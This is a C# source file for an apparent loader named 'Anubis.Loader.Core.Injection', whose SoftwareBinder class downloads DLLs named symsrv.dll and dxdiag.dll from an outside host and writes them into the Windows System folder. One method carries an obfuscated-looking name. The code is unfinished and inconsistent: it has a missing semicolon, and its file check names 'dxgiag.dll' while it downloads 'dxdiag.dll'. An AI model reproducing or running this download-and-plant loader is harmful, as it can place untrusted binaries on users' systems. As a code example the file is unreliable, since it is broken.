using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Anubis.Loader.Core.Injection
{
    public class SoftwareBinder
    {
        private static string m_Uri = "https://anubiss.cc/api/v1/loader/download/{file_name}";
        private WebClient m_WebClient;

        public void Bind()
        {
            if (ApplySoftware())
            {
                //TODO: download more
            }
        }

        private void ccbabbcayrxcklvucvlybnlvCTCVBNLKCycvlunLVVkblbcvkbn()
        {
            if(m_WebClient == null)
            {
                m_WebClient = new WebClient();
            }

            var temp_folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        }

        private string ConcatApi(string file)
        {
            return m_Uri.Replace("{file_name}", file);
        }

        private bool IsRequiredSoftwareExists()
        {
            return IsRequiredSoftwareItemExists("symsrv.dll")
                && IsRequiredSoftwareItemExists("dxgiag.dll");
        }

        private bool IsRequiredSoftwareItemExists(string item)
            => File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), item));

        private bool ApplySoftware()
        {
            if(m_WebClient == null)
            {
                m_WebClient = new WebClient();
            }

            var sys_folder = Environment.GetFolderPath(Environment.SpecialFolder.System);
            if (!IsRequiredSoftwareItemExists("symsrv.dll"))
            {
                m_WebClient.DownloadFile(ConcatApi("symsrv.dll"), Path.Combine(sys_folder, "symsrv.dll"));
                if (!IsRequiredSoftwareItemExists("symsrv.dll"))
                    return false;
            }

            if (!IsRequiredSoftwareItemExists("dxdiag.dll"))
            {
                m_WebClient.DownloadFile(ConcatApi("dxdiag.dll"), Path.Combine(sys_folder, "dxdiag.dll"));
                if (!IsRequiredSoftwareItemExists("dxdiag.dll"))
                    return false;
            }

            return IsRequiredSoftwareExists();
        }
    }
}
